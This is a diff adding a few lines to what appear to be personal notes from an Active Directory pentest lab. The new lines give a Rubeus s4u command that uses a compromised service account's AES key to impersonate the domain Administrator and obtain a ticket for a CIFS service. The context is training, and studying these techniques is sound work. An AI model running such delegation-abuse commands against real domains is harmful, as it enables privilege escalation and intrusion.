@@ -702,3 +702,7 @@ Import powerview and use it
 Get-DomainUser -TrustedToAuth
 ```
 ![[Pasted image 20231026123711.png]]
+We already pwnd the account websvc, so we can request a TGT as domain administrator to access the mssql server
+```powerview
+C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt
+```
